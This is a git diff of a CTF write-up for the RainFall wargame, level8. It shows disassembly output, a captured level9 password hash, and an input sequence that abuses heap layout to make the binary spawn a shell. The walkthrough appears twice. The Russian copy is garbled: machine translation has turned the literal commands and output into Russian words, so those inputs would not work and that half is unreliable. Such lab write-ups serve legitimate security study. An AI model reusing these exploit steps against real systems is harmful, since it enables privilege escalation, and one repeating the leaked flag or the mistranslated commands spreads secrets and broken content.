@@ -65,15 +65,6 @@ Dump of assembler code for function main:
 
 
 level8@RainFall:~$ objdump -d -j.rodata ./level8
-
-./level8:     file format elf32-i386
-
-
-Disassembly of section .rodata:
-
-08048808 <_fp_hw>:
- 8048808:	03 00 00 00                                         ....
-
 0804880c <_IO_stdin_used>:
  804880c:	01 00 02 00 25 70 2c 20 25 70 20 0a 00 61 75 74     ....%p, %p ..aut
  804881c:	68 20 00 72 65 73 65 74 00 73 65 72 76 69 63 65     h .reset.service
@@ -98,3 +89,42 @@ $ cat ../level8/.pass
 cat: ../level8/.pass: Permission denied
 $ cat /home/user/level9/.pass
 c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
+
+
+
+
+
+
+После разборки двоичного файла мы поняли, что должны отправить это:
+
+level8 @ RainFall: ~ $ ./level8 
+(ноль), (ноль) 
+auth abcdefghijklmnopqrstuvwxyz
+0x804a008, (ноль) 
+сервисаааааааааааааааааааааааааааааа
+0x804a008, 0x804a018 
+авторизоваться
+$
+
+двоичный файл создает систему ('/ bin / bash'), когда соблюдается первое условие
+и когда мы отправляем "сервис" 
+двоичный файл проверяет, что во время "входа в систему"
+32-й символ не 0.
+
+
+After dissassemble the binary, we understood that we have to send this :
+
+level8@RainFall:~$ ./level8 
+(nil), (nil) 
+auth abcdefghijklmnopqrstuvwxyz
+0x804a008, (nil) 
+serviceaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+0x804a008, 0x804a018 
+login
+$
+
+the binary make a system('/bin/bash') when the first condition is respected
+and when we send "service" 
+the binary verifies that during the "login"
+the 32nd character is not 0.
+
